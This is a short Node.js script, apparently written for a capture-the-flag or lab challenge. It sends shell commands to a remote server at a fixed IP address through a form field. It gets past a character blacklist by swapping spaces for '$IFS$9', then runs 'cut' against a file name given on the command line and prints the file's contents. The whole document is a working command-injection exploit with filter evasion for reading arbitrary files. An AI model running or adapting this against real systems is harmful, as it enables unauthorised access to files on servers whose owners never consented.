const got = require('got')
const assert = require('assert')

const HOST = 'http://120.55.43.255:20133'

const INVALID_CHARS_REGEXP = /[;\/\|<> ]/g

const request = (command) => {
  assert(!INVALID_CHARS_REGEXP.test(command), 'Invalid characters found')
  return got.post(`${HOST}/`, {
    form: {
      a: command,
    },
  })
}

const encode = (command) => command .replace(/ /g, '$IFS$9')

;(async () => {
  const filename = process.argv.slice(2)[0]
  const command = `cut -f -10000 ${filename}`
  const response = await request(encode(command))
  console.log(command)
  console.log(response.body)
})()
